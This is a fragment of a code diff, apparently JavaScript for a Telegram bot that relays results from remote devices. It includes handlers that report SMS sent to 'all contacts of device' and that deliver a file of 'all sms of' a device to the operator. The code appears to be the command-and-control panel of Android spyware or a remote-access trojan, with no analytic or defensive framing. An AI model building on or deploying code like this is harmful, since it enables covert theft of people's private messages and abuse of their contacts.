+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "sendAllSMS"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "getAllSMS"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "document",
+                                        caption: build(`📥 ${sym} all sms of `) + message.shortcut.device_id
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendDocument(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} all sms of `) + message.shortcut.device_id
                                     }
                                 )
                             } else {
